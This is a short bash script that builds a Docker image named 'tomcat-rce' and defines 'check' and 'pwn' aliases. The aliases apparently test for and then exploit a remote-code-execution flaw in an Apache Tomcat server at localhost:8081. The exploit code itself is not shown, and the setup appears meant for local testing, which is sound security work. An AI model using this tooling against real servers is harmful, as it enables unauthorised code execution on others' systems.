#!/usr/bin/env bash
HOSTIP=$(ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1' | head -1)
echo Detected $HOSTIP as your host IP
docker build -t tomcat-rce tomcat-rce
# Network ip for docker container. Does not work with host ip
alias check="docker run --rm -it tomcat-rce -u http://localhost:8081"
alias pwn="docker run --rm -it tomcat-rce -u http://localhost:8081 -p pwn"

# alias check="docker run --rm -it tomcat-rce -u http://${HOSTIP}:8081"
# alias pwn="docker run --rm -it tomcat-rce -u http://${HOSTIP}:8081 -p pwn"
